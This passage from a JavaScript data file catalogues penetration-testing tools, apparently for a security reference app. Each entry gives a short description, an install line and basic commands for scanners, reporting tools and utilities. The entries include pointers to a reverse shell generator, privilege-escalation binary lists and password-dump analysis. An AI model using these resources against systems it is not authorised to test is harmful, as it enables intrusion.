  { name:'Nessus', slug:'nessus', category:'Vulnerability Analysis', icon:'🔍', difficulty:'intermediate', shortDesc:'Vulnerability scanner', description:'Nessus is a vulnerability scanner.', installation:'Download from tenable.com', syntax:'/opt/nessus/sbin/nessusd', keywords:['scanner'], commands:[
    {title:'Start',command:'sudo /opt/nessus/sbin/nessusd start',explanation:'Start',example:'sudo /opt/nessus/sbin/nessusd start'}
  ]},
  { name:'Lynis', slug:'lynis', category:'Vulnerability Analysis', icon:'🐧', difficulty:'intermediate', shortDesc:'Unix security auditing', description:'Lynis is a security auditing tool.', installation:'sudo apt install lynis', syntax:'sudo lynis audit system', keywords:['audit'], commands:[
    {title:'Full Audit',command:'sudo lynis audit system',explanation:'Full audit',example:'sudo lynis audit system'},
    {title:'Remote',command:'sudo lynis audit remote <host>',explanation:'Remote',example:'sudo lynis audit remote 192.168.1.1'}
  ]},
  { name:'Nuclei', slug:'nuclei', category:'Vulnerability Analysis', icon:'⚛️', difficulty:'intermediate', shortDesc:'Template-based scanner', description:'Nuclei is a fast vulnerability scanner.', installation:'sudo apt install nuclei', syntax:'nuclei -u <url>', keywords:['scanner'], commands:[
    {title:'Scan',command:'nuclei -u <url>',explanation:'Scan target',example:'nuclei -u https://example.com'},
    {title:'CVE Templates',command:'nuclei -u <url> -tags cve',explanation:'CVE',example:'nuclei -u https://example.com -tags cve'},
    {title:'Severity',command:'nuclei -u <url> -severity critical,high',explanation:'Severity',example:'nuclei -u https://example.com -severity critical,high'}
  ]},
  { name:'Trivy', slug:'trivy', category:'Vulnerability Analysis', icon:'🐳', difficulty:'intermediate', shortDesc:'Container scanner', description:'Trivy scans containers.', installation:'sudo apt install trivy', syntax:'trivy image <image>', keywords:['container'], commands:[
    {title:'Image',command:'trivy image nginx:latest',explanation:'Scan',example:'trivy image nginx:latest'},
    {title:'Filesystem',command:'trivy fs .',explanation:'FS',example:'trivy fs .'},
    {title:'Repo',command:'trivy repo <url>',explanation:'Repo',example:'trivy repo https://github.com/user/repo'}
  ]},

  // REPORTING
  { name:'Dradis', slug:'dradis', category:'Reporting', icon:'📊', difficulty:'intermediate', shortDesc:'Collaboration platform', description:'Dradis is a reporting platform.', installation:'sudo apt install dradis', syntax:'dradis', keywords:['report'], commands:[
    {title:'Launch',command:'dradis',explanation:'Web UI',example:'dradis'}
  ]},
  { name:'Faraday', slug:'faraday', category:'Reporting', icon:'🔌', difficulty:'intermediate', shortDesc:'Pentest IDE', description:'Faraday is a pentest IDE.', installation:'sudo apt install faraday', syntax:'faraday', keywords:['pentest'], commands:[
    {title:'Launch',command:'faraday',explanation:'GUI',example:'faraday'}
  ]},
  { name:'Pipal', slug:'pipal', category:'Reporting', icon:'🍇', difficulty:'beginner', shortDesc:'Password analyzer', description:'Pipal analyzes password dumps.', installation:'gem install pipal', syntax:'pipal <wordlist>', keywords:['password'], commands:[
    {title:'Analyze',command:'pipal rockyou.txt',explanation:'Analyze',example:'pipal rockyou.txt'}
  ]},

  // UTILITIES
  { name:'CyberChef', slug:'cyberchef', category:'Utilities', icon:'👨‍🍳', difficulty:'beginner', shortDesc:'Data manipulation tool', description:'CyberChef is a web-based data manipulation tool.', installation:'Browser based - gchq.github.io/CyberChef', syntax:'Browser', keywords:['utility'], commands:[
    {title:'Open',command:'firefox https://gchq.github.io/CyberChef/',explanation:'Open tool',example:'firefox https://gchq.github.io/CyberChef/'}
  ]},
  { name:'Hash-Identifier', slug:'hash-identifier', category:'Utilities', icon:'🔑', difficulty:'beginner', shortDesc:'Identify hash types', description:'Hash-Identifier identifies hash types.', installation:'sudo apt install hash-identifier', syntax:'hash-identifier', keywords:['hash'], commands:[
    {title:'Launch',command:'hash-identifier',explanation:'Interactive',example:'hash-identifier'}
  ]},
  { name:'Revshells', slug:'revshells', category:'Utilities', icon:'🐚', difficulty:'beginner', shortDesc:'Reverse shell generator', description:'Revshells generates reverse shell payloads.', installation:'Browser - revshells.com', syntax:'Browser', keywords:['shell'], commands:[
    {title:'Open',command:'firefox https://www.revshells.com/',explanation:'Open tool',example:'firefox https://www.revshells.com/'}
  ]},
  { name:'GTFOBins', slug:'gtfobins', category:'Utilities', icon:'📚', difficulty:'beginner', shortDesc:'Unix binary exploitation', description:'GTFOBins is a list of Unix binaries that can bypass security.', installation:'Browser - gtfobins.github.io', syntax:'Browser', keywords:['privilege'], commands:[
    {title:'Open',command:'firefox https://gtfobins.github.io/',explanation:'Open tool',example:'firefox https://gtfobins.github.io/'}
  ]},
  { name:'LOLBAS', slug:'lolbas', category:'Utilities', icon:'📚', difficulty:'beginner', shortDesc:'Windows binary exploitation', description:'LOLBAS lists Windows binaries for red team.', installation:'Browser - lolbas-project.github.io', syntax:'Browser', keywords:['windows'], commands:[
    {title:'Open',command:'firefox https://lolbas-project.github.io/',explanation:'Open tool',example:'firefox https://lolbas-project.github.io/'}
  ]}
  
];